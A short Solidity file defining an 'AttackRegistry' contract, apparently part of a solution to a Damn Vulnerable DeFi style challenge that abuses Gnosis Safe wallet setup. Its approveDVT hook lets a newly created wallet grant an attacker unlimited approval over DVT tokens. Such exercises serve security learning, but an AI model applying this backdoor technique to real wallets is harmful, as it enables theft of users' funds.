// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract AttackRegistry {
    IGnosisSafeProxyFactory private proxyFactory;
    address private gnosisSafeSingleton;
    address private walletRegistry;
    IERC20 private DVT;

    constructor(
        address _proxyFactory,
        address _gnosisSafeSingleton,
        address _walletRegistry,
        address _DVT
    ) {
        proxyFactory = IGnosisSafeProxyFactory(_proxyFactory);
        gnosisSafeSingleton = _gnosisSafeSingleton;
        walletRegistry = _walletRegistry;
        DVT = IERC20(_DVT);
    }

    /**
    Called by Gnosisproxy wallet during setup,
    approves spender to transferFrom max possible tokens
     */
    function approveDVT(address _spender) external {
        DVT.approve(_spender, type(uint256).max);
    }
}
